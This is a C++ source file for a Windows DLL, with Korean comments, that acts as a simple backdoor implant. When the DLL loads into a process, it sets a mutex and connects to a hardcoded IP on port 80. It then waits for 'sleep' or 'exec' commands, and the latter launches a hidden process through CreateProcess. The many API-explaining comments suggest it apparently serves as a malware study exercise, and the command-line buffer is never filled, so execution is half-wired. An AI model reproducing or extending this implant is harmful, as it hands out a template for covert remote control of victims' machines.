// dllmain.cpp : DLL 애플리케이션의 진입점을 정의합니다.
#include "pch.h"
#include <WinSock2.h>
#pragma comment(lib, "ws2_32")

void Func();

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: //DLL이 프로세스의 주소 공간에 최초로 매핑되면, 
		Func();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

#define BUF_SIZE 4096 

void Func()
{
	WSAData wsaData;
	sockaddr sockadr;
	char buf[BUF_SIZE] = { 0x00, };
	char cp[] = "192.168.0.0"; //"127.26.152.13"
	char szCommandLine[MAX_PATH] = { 0x00, }; //실행시킬 프로세스 이름
	 
	memset(&sockadr, 0, sizeof(sockadr));

	if (!OpenMutex(MUTEX_ALL_ACCESS, FALSE, "SADFHUHF"))
	{
		CreateMutex(NULL, FALSE, "SADFHUHF");
		if (!WSAStartup(202, &wsaData))
		{
			SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

			//AF_UNSPEC	(0)  : The address family is unspecified.
			//AF_INET	(2)  : The Internet Protocol version 4 (IPv4) address family.
			//AF_INET6	(23) : The Internet Protocol version 6 (IPv6) address family.
	
			if (sock != INVALID_SOCKET)
			{
				sockadr.sa_family = AF_INET;

				*(u_short *)&sockadr.sa_data[0] = htons(80); //포트
				*(u_long *)&sockadr.sa_data[2] = inet_addr(cp); //주소

				//htonl : (4바이트 데이터)호스트 바이트 정렬 방식 -> 네트워크 바이트 정렬 방식
				//htons : (2바이트 데이터)호스트 바이트 정렬 방식 -> 네트워크 바이트 정렬 방식
				//ntohl : (4바이트 데이터)네트워크 바이트 정렬 방식 ->호스트 바이트 정렬 방식
				//ntohs : (2바이트 데이터)네트워크 바이트 정렬 방식 ->호스트 바이트 정렬 방식

				//inet_addr() : 인터넷 주소 cp를 32bit 바이너리 주소로 변경한값을 리턴한다. 리턴된 값은 네트워크 바이트 오더를 따른다

				if (connect(sock, (struct sockaddr *)&sockadr, sizeof(sockadr)) != SOCKET_ERROR)
				{
					while ( send(sock, "hello", strlen("hello"), 0) != SOCKET_ERROR && shutdown(sock, SD_SEND) != SOCKET_ERROR)
					{
						//shutdown how 인자
						//SD_RECEIVE : 입력 스트림 종료. 상대에게 더이상 데이터를 받지 않음
						//SD_SEND	 : 출력 스트림 종료. 상대에게 더이상 데이터 전송하지 않음. 상대에게 더이상 보낼 데이터가 없다는 의미로 FIN을 상대에게 날리고, 4-way handshake를 유도함.
						//SD_BOTH	 : 입출력 스트림 종료. 상대에게 더이상 데이터를 받지 않고 전송도 안함. FIN을 상대에게 날리고, 자신의 소켓을 바로 닫음.

						if (recv(sock, buf, BUF_SIZE, 0) > 0)
						{
							if (!strncmp("sleep", buf, strlen("sleep")))
							{
								Sleep(60000);
							}
							else if (!strncmp("exec", buf, strlen("exec")))
							{
								STARTUPINFO si;
								PROCESS_INFORMATION pi;

								memset(&si, 0, sizeof(si));

								si.cb = sizeof(STARTUPINFO); //cb - 구조체 변수의 크기를 전달한다.
								
								CreateProcess(NULL, szCommandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
							}
							else
							{
								break;
							}
						}
					}

					closesocket(sock);
				}

				WSACleanup();
			}

		}
	}

}
